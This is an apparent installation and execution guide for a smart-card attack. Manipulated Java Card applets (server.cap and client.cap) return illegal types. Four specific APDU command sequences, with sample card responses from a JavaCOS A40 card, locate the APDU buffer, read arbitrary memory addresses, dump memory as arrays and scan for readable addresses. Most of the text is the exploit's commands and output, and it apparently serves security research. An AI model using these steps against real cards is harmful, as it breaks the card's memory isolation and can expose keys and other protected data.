=============================================================================================================================================

INSTRUCTIONS FOR INSTALLATION AND EXECUTION

==========================================================================

Step 1:  Install server.cap and client.cap given in CAP_File folder. The server.cap contains two methods which been manipulated to return illegal return types.  

==========================================================================

Step 2:  Communicate with ClientApplet using ComnCard class and execute the attack. ComnCard class is located in Project/Shareable/src/packageTest/ folder. Attack can be carried out in four ways. The cases are explained with an example as given below:

	    /**
             * Following example based on tests on JavaCOS A40 card
             * 
             * CASE-1: To find the memory address of APDU Buffer
             * 
             * apdu[CardMngr.OFFSET_CLA] = (byte) 0xB0;
             * apdu[CardMngr.OFFSET_INS] = (byte) 0x70; 
             * apdu[CardMngr.OFFSET_P1] = (byte) 0x00;
             * apdu[CardMngr.OFFSET_P2] = (byte) 0x00;
             * 
             * Returns 00 50 as memory reference of APDU Buffer
             * 
             * CASE-2: To find the content of memory address 0092 at offset 0014
             * 
             * MEMORY_ADDRESS[] = {(byte) 0x00, (byte) 0x92};
             * apdu[CardMngr.OFFSET_CLA] = (byte) 0xB0;
             * apdu[CardMngr.OFFSET_INS] = (byte) 0x71; 
             * apdu[CardMngr.OFFSET_P1] = (byte) 0x00;
             * apdu[CardMngr.OFFSET_P2] = (byte) 0x14;
             * 
             * Returns 00 92 00 b0 00 14 0e 00
             * where:
             * 0092 = address passed
             * 00b0 = length of short[]
             * 0014 = offset of short[] passed
             * 0e00 = content of short[] at offset returned from illegal memory read 
             * 
             * CASE-3: To find the content of memory address 008c as array starting from offset 0000
             * 
             * MEMORY_ADDRESS[] = {(byte) 0x00, (byte) 0x8c};
             * MAXLENGTH[]     = {(byte) 0x00, (byte) 0x20};
             * apdu[CardMngr.OFFSET_CLA] = (byte) 0xB0;
             * apdu[CardMngr.OFFSET_INS] = (byte) 0x72; 
             * apdu[CardMngr.OFFSET_P1] = (byte) 0x00;
             * apdu[CardMngr.OFFSET_P2] = (byte) 0x00;
             * 
             * Returns 01 00 00 8d 80 00 00 06 73 69 6d 70 6c 65 00 00 20 00 01 00 08 00 00 00 00 00 00 00 00 8c 00 8f 90 00  
             * where each short value is the content of short[] at the memory address passed
             * 
             * CASE-4: To find the readable memory addresses starting from 0050, Number of iterations are 0040.
             *         (Not all the memory addresses were readable)
             * 
             * MEMORY_ADDRESS[] = {(byte) 0x00, (byte) 0x50};
             * MAXLENGTH[]     = {(byte) 0x00, (byte) 0x40};
             * apdu[CardMngr.OFFSET_CLA] = (byte) 0xB0;
             * apdu[CardMngr.OFFSET_INS] = (byte) 0x73; 
             * apdu[CardMngr.OFFSET_P1] = (byte) 0x00;
             * apdu[CardMngr.OFFSET_P2] = (byte) 0x00;
             * 
             * Returns
             * 00 50 00 52 00 54 00 56 00 58 00 80 00 82 00 86 00 8c 00 92 00 b6 00 c2 00 c4 00 c6 00 ca 00 00 00 00 00 00 00 00 00 
             * 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 90 00 
             * 
             * where each short value is the memory addresses readable. If value is 0000, memory address is not accesssible 
             */

=============================================================================================================================================
